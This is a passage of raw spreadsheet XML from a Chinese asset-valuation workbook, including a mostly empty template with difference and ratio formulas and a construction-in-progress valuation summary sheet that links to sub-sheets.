          <t>原值</t>
        </is>
      </c>
      <c r="H6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="J6" s="594" t="n"/>
      <c r="K6" s="594" t="n"/>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="347" t="n"/>
      <c r="N6" s="156" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-F7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(F7=0,"",J7/F7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
      <c r="M7" s="347" t="n"/>
      <c r="N7" s="156" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>G8-E8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(E8=0,"",J8/E8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
      <c r="M8" s="347" t="n"/>
      <c r="N8" s="156" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>G9-E9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(E9=0,"",J9/E9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
      <c r="M9" s="347" t="n"/>
      <c r="N9" s="156" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>G10-E10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(E10=0,"",J10/E10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
      <c r="M10" s="347" t="n"/>
      <c r="N10" s="156" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>G11-E11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(E11=0,"",J11/E11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
      <c r="M11" s="347" t="n"/>
      <c r="N11" s="156" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>G12-E12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(E12=0,"",J12/E12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
      <c r="M12" s="347" t="n"/>
      <c r="N12" s="156" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>G13-E13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(E13=0,"",J13/E13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
      <c r="M13" s="347" t="n"/>
      <c r="N13" s="156" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>G14-E14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(E14=0,"",J14/E14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
      <c r="M14" s="347" t="n"/>
      <c r="N14" s="156" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>G15-E15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(E15=0,"",J15/E15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
      <c r="M15" s="347" t="n"/>
      <c r="N15" s="156" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>G16-E16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(E16=0,"",J16/E16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
      <c r="M16" s="347" t="n"/>
      <c r="N16" s="156" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>G17-E17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(E17=0,"",J17/E17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
      <c r="M17" s="347" t="n"/>
      <c r="N17" s="156" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>G18-E18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(E18=0,"",J18/E18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
      <c r="M18" s="347" t="n"/>
      <c r="N18" s="156" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>G19-E19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(E19=0,"",J19/E19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
      <c r="M19" s="347" t="n"/>
      <c r="N19" s="156" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>G20-E20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(E20=0,"",J20/E20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
      <c r="M20" s="347" t="n"/>
      <c r="N20" s="156" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>G21-E21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(E21=0,"",J21/E21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
      <c r="M21" s="347" t="n"/>
      <c r="N21" s="156" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>G22-E22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(E22=0,"",J22/E22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
      <c r="M22" s="347" t="n"/>
      <c r="N22" s="156" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>G23-E23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(E23=0,"",J23/E23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
      <c r="M23" s="347" t="n"/>
      <c r="N23" s="156" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>G24-E24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(E24=0,"",J24/E24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
      <c r="M24" s="347" t="n"/>
      <c r="N24" s="156" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>G25-E25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(E25=0,"",J25/E25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
      <c r="M25" s="347" t="n"/>
      <c r="N25" s="156" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>G26-E26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(E26=0,"",J26/E26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
      <c r="M26" s="347" t="n"/>
      <c r="N26" s="156" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="555" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555">
        <f>G27-E27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(E27=0,"",J27/E27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
      <c r="M27" s="347" t="n"/>
      <c r="N27" s="156" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="578" t="n"/>
      <c r="E28" s="555" t="n"/>
      <c r="F28" s="555" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>G28-E28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(E28=0,"",J28/E28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
      <c r="M28" s="347" t="n"/>
      <c r="N28" s="156" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合         计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="555">
        <f>SUM(E7:E28)</f>
        <v/>
      </c>
      <c r="F29" s="555">
        <f>SUM(F7:F28)</f>
        <v/>
      </c>
      <c r="G29" s="555">
        <f>SUM(G7:G28)</f>
        <v/>
      </c>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="555">
        <f>SUM(I7:I28)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>I29-F29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(F29=0,"",J29/F29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
      <c r="M29" s="347" t="n"/>
      <c r="N29" s="156" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
    <row r="32" s="415">
      <c r="A32" s="116" t="n"/>
    </row>
    <row r="33" s="415">
      <c r="A33" s="116" t="n"/>
    </row>
    <row r="34" s="415">
      <c r="A34" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="12">
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="J5:J6"/>
    <mergeCell ref="G5:I5"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="E5:F5"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="K5:K6"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="L5:L6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L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3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 codeName="Sheet63">
    <tabColor rgb="FF92D050"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K25"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScale="90" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A25" sqref="A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="7.83333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="28" customWidth="1" style="410" min="4" max="4"/>
    <col width="20.6666666666667" customWidth="1" style="410" min="5" max="7"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>在建工程评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
      <c r="I2" s="376" t="n"/>
      <c r="J2" s="376" t="n"/>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="373" t="n"/>
      <c r="G3" s="373" t="n"/>
      <c r="H3" s="402" t="inlineStr">
        <is>
          <t>表4-9</t>
        </is>
      </c>
      <c r="I3" s="376" t="n"/>
      <c r="J3" s="376" t="n"/>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="323" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="I5" s="344" t="n"/>
      <c r="J5" s="344" t="n"/>
      <c r="K5" s="154" t="n"/>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>4-9-1</t>
        </is>
      </c>
      <c r="C6" s="284" t="inlineStr">
        <is>
          <t>在建土建</t>
        </is>
      </c>
      <c r="D6" s="198" t="inlineStr">
        <is>
          <t>在建工程—土建工程</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'4-9-1在建（土建）'!J29</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'4-9-1在建（土建）'!K29</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="347" t="n"/>
      <c r="J6" s="347" t="n"/>
      <c r="K6" s="156" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>4-9-2</t>
        </is>
      </c>
      <c r="C7" s="284" t="inlineStr">
        <is>
          <t>在建设备</t>
        </is>
      </c>
      <c r="D7" s="198" t="inlineStr">
        <is>
          <t>在建工程—设备安装工程</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'4-9-2在建（设备）'!L29</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'4-9-2在建（设备）'!P29</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="347" t="n"/>
      <c r="J7" s="347" t="n"/>
      <c r="K7" s="156" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>4-9-3</t>
        </is>
      </c>
      <c r="C8" s="323" t="inlineStr">
        <is>
          <t>在建物资</t>
        </is>
      </c>
      <c r="D8" s="199" t="inlineStr">
        <is>
          <t>在建工程—工程物资</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'4-9-3在建工程（工程物资）'!H29</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'4-9-3在建工程（工程物资）'!K29</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="347" t="n"/>
      <c r="J8" s="347" t="n"/>
      <c r="K8" s="156" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B9" s="284" t="n"/>
      <c r="C9" s="284" t="n"/>
      <c r="D9" s="200" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="555">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
      <c r="I9" s="347" t="n"/>
      <c r="J9" s="347" t="n"/>
      <c r="K9" s="156" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B10" s="284" t="n"/>
      <c r="C10" s="284" t="n"/>
      <c r="D10" s="200" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="347" t="n"/>
      <c r="J10" s="347" t="n"/>
      <c r="K10" s="156" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B11" s="284" t="n"/>
      <c r="C11" s="284" t="n"/>
      <c r="D11" s="200" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="347" t="n"/>
      <c r="J11" s="347" t="n"/>
      <c r="K11" s="156" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B12" s="284" t="n"/>
      <c r="C12" s="284" t="n"/>
      <c r="D12" s="200" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="347" t="n"/>
      <c r="J12" s="347" t="n"/>
      <c r="K12" s="156" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B13" s="284" t="n"/>
      <c r="C13" s="284" t="n"/>
      <c r="D13" s="200" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="347" t="n"/>
      <c r="J13" s="347" t="n"/>
      <c r="K13" s="156" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B14" s="284" t="n"/>
      <c r="C14" s="284" t="n"/>
      <c r="D14" s="200" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="347" t="n"/>
      <c r="J14" s="347" t="n"/>
      <c r="K14" s="156" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B15" s="284" t="n"/>
      <c r="C15" s="284" t="n"/>
      <c r="D15" s="200" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="347" t="n"/>
      <c r="J15" s="347" t="n"/>
      <c r="K15" s="156" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B16" s="284" t="n"/>
      <c r="C16" s="284" t="n"/>
      <c r="D16" s="200" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="347" t="n"/>
      <c r="J16" s="347" t="n"/>
      <c r="K16" s="156" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B17" s="284" t="n"/>
      <c r="C17" s="284" t="n"/>
      <c r="D17" s="200" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="347" t="n"/>
      <c r="J17" s="347" t="n"/>
      <c r="K17" s="156" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B18" s="284" t="n"/>
      <c r="C18" s="284" t="n"/>
      <c r="D18" s="200" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="347" t="n"/>
      <c r="J18" s="347" t="n"/>
      <c r="K18" s="156" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B19" s="284" t="n"/>
      <c r="C19" s="284" t="n"/>
      <c r="D19" s="200" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="347" t="n"/>
      <c r="J19" s="347" t="n"/>
      <c r="K19" s="156" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B20" s="284" t="n"/>
      <c r="C20" s="284" t="n"/>
      <c r="D20" s="201" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="347" t="n"/>
      <c r="J20" s="347" t="n"/>
      <c r="K20" s="156" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B21" s="284" t="n"/>
      <c r="C21" s="284" t="n"/>
      <c r="D21" s="200" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="347" t="n"/>
      <c r="J21" s="347" t="n"/>
      <c r="K21" s="156" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B22" s="284" t="n"/>
      <c r="C22" s="284" t="n"/>
      <c r="D22" s="201" t="n"/>
      <c r="E22" s="555" t="n"/>
